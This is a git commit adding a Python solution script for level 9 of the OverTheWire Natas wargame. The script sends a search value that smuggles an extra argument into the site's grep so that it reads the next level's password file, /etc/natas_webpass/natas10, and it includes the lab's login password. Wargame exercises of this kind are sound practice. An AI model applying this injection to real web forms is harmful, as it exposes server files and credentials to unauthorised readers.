22c187af5b536849859a74dd903640f3694b2a94
yaudahbanh <juniorvincent32@gmail.com>
2024-07-18 20:36:38 +0700

    feat: add level_9

---
+++ Natas/level_9.py
@@ -0,0 +1,19 @@
+import requests
+import re
+requests.packages.urllib3.disable_warnings()
+
+url = "http://natas9.natas.labs.overthewire.org"
+
+def exp():
+    data_post = {
+        "needle": ". /etc/natas_webpass/natas10",
+        "submit": "Search"
+    }
+    r = requests.post(url, auth=('natas9', 'ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t'), verify=False, data=data_post)
+    if r.status_code == 200:
+        password = re.findall(r'/etc/natas_webpass/natas10:(.*)', r.text)[0]
+        print("Password for natas10: " + password)
+        
+
+if __name__ == "__main__":
+    exp()
